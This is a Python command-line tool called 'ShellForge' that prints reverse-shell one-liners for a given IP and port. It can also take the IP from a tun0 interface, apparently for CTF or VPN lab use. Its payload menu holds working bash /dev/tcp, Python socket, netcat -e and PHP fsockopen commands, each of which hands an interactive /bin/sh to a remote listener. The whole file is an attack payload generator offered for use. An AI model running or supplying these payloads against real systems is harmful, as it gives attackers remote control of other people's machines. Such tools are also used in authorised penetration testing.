#!/usr/bin/env python3
from rich import print
from rich.console import Console
from rich.panel import Panel
from pyfiglet import Figlet
import netifaces as ni
import sys


console = Console()


def show_banner():
    console = Console()

    # === Titel
    fig = Figlet(font="slant")
    banner = fig.renderText("ShellForge")

    console.print(f"[bold cyan]{banner}[/bold cyan]")

    # === ASCII logo
    ascii_logo = r"""
       /\
      |==|   Payload Generator
      |  |   ------------------
      |  |   Author: @Certifa
     /____\
    [======]
    |  💥  |   [~] Ready to forge shells
    '------'
    """
    console.print(ascii_logo, style="bold green")


show_banner()

import netifaces as ni


def get_tun0_ip():
    """Get IP from tun0 interface"""
    try:
        if "tun0" not in ni.interfaces():
            console.print("[yellow]⚠️  tun0 not found[/yellow]")
            return None
        addrs = ni.ifaddresses("tun0")
        if ni.AF_INET in addrs:
            ip = addrs[ni.AF_INET][0]["addr"]
            console.print(f"[green]✓[/green] tun0: [cyan]{ip}[/cyan]")
            return ip
    except:
        return None
    return None


# === Usage Panel
print(
    Panel.fit(
        "[bold white]Usage:[/bold white] python3 payloadgen.py [bold cyan]<IP|--tun0> <PORT>[/bold cyan]\n\n"
        "[bold]Examples:[/bold]\n"
        "  python3 payloadgen.py 10.10.14.5 4444\n"
        "  python3 payloadgen.py --tun0 4444",
        title="[bold yellow]📘 How to use[/bold yellow]",
        border_style="blue",
    )
)


# === Argument check
if len(sys.argv) == 3 and sys.argv[1] == "--tun0":
    ip = get_tun0_ip()
    if not ip:
        console.print("[red]Failed to detect tun0[/red]")
        sys.exit(1)
    port = sys.argv[2]
elif len(sys.argv) == 3:
    ip = sys.argv[1]
    port = sys.argv[2]
else:
    console.print(
        "[bold red]❌ Error:[/bold red] You must provide [cyan]<IP|--tun0>[/cyan] and [cyan]<PORT>[/cyan]."
    )
    sys.exit(1)


# === Menu
payloads = {
    "1": ("Bash TCP", f"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"),
    "2": (
        "Python TCP",
        f'python3 -c \'import os,socket,subprocess;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
    ),
    "3": ("Netcat (traditional)", f"nc {ip} {port} -e /bin/sh"),
    "4": (
        "PHP",
        f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    ),
    "5": ("Exit", None),
}

console.print("\n[bold magenta]Payload options:[/bold magenta]")
for key, val in payloads.items():
    console.print(f"[cyan]{key}.[/cyan] {val[0]}")

choice = console.input("\n[bold yellow]Enter your choice: [/bold yellow]").strip()

if choice not in payloads:
    console.print("[bold red]❌ Invalid option.[/bold red]")
    sys.exit(1)

if choice == "5":
    console.print("[bold yellow]👋 Exiting...[/bold yellow]")
    sys.exit(0)
# === Print payload
name, payload = payloads[choice]
console.print(f"\n[bold green]✅ Payload: {name}[/bold green]\n")
console.print(f"[italic white on black]{payload}[/italic white on black]\n")
